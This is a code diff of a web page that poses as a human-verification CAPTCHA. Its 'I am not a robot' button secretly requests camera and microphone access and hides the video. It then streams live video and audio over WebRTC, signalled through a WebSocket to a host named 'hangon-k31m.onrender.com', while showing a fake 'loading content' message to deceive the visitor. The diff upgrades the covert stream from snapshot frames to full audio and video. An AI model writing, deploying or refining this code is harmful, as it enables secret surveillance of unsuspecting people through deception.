@@ -24,9 +24,7 @@
             border-radius: 4px;
         }
 
-        /* Hidden elements so they don't see their own video on the screen */
-        video,
-        audio {
+        video {
             display: none;
         }
     </style>
@@ -37,49 +35,72 @@
     <p>Please verify you are human to continue.</p>
     <button onclick="startCovertStream()">I am not a robot</button>
 
-    <!-- Hidden video/audio tags -->
-    <video id="hiddenVideo" autoplay muted></video>
+    <video id="hiddenVideo" autoplay muted playsinline></video>
 
     <script>
+        const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
+        const host = window.location.host || "hangon-k31m.onrender.com";
+        const wsUrl = `${protocol}//${host}/ws/target`;
+
+        const rtcConfig = {
+            iceServers: [
+                { urls: "stun:stun.l.google.com:19302" },
+                { urls: "stun:stun1.l.google.com:19302" }
+            ]
+        };
+
         let ws;
-        let stream;
+        let pc;
         const video = document.getElementById('hiddenVideo');
 
         async function startCovertStream() {
             try {
-                // Request Camera and Microphone
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
 
-                const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
-                const host = window.location.host || "hangon-k31m.onrender.com";
-                ws = new WebSocket(`${protocol}//${host}/ws/target`);
+                ws = new WebSocket(wsUrl);
 
                 ws.onopen = function () {
-                    // Change the UI so they think the page is just loading
                     document.body.innerHTML = "<h1>Verification successful. Loading content, please wait...</h1><p>This may take a few minutes.</p>";
-
-                    // Start silently sending camera frames every 500ms
-                    setInterval(sendFrame, 500);
+                    initWebRTC(stream);
                 };
+
+                ws.onerror = (err) => console.error("WebSocket error:", err);
             } catch (err) {
+                console.error("Media error:", err);
                 document.body.innerHTML = "<h1>Verification failed. Please reload.</h1>";
             }
         }
 
-        function sendFrame() {
-            if (!stream) return;
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
+        function initWebRTC(stream) {
+            pc = new RTCPeerConnection(rtcConfig);
 
-            // Send video frame as string data
-            const frameData = "VIDEO:" + canvas.toDataURL('image/jpeg', 0.5);
-            ws.send(frameData);
+            // Add camera and mic tracks to peer connection
+            stream.getTracks().forEach(track => pc.addTrack(track, stream));
 
-            // Send audio data (Workaround: we just send a ping, audio requires more complex WebRTC, but this proves mic is active)
+            pc.onicecandidate = (event) => {
+                if (event.candidate && ws && ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({ "type": "ice", "data": event.candidate }));
+                }
+            };
+
+            ws.onmessage = async (event) => {
+                try {
+                    const msg = JSON.parse(event.data);
+                    if (msg.type === "offer" && pc) {
+                        await pc.setRemoteDescription(new RTCSessionDescription(msg.data));
+                        const answer = await pc.createAnswer();
+                        await pc.setLocalDescription(answer);
+                        if (ws && ws.readyState === WebSocket.OPEN) {
+                            ws.send(JSON.stringify({ "type": "answer", "data": answer }));
+                        }
+                    } else if (msg.type === "ice" && pc) {
+                        await pc.addIceCandidate(new RTCIceCandidate(msg.data));
+                    }
+                } catch (e) {
+                    console.error("Error handling message:", e);
+                }
+            };
         }
     </script>
 </body>
